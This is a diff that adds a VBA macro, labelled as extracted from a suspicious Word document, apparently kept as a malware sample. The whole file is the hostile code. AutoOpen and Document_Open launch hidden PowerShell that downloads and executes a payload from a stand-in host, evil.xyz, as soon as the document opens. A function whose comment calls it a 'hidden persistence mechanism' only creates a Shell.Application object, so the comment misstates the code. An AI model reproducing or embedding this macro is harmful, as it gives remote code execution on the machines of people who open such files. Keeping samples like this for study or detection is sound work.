@@ -1,0 +1,21 @@
+VBA MACRO SOURCE (extracted from suspicious .docx)
+====================================================
+
+Attribute VB_Name = "ThisDocument"
+
+Sub AutoOpen()
+    Dim objShell As Object
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "powershell -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://evil.xyz/payload')"
+End Sub
+
+Sub Document_Open()
+    Call AutoOpen
+End Sub
+
+Function GetObject(path As String) As Object
+    ' hidden persistence mechanism
+    Set GetObject = CreateObject("Shell.Application")
+End Function
+
+' End of macro
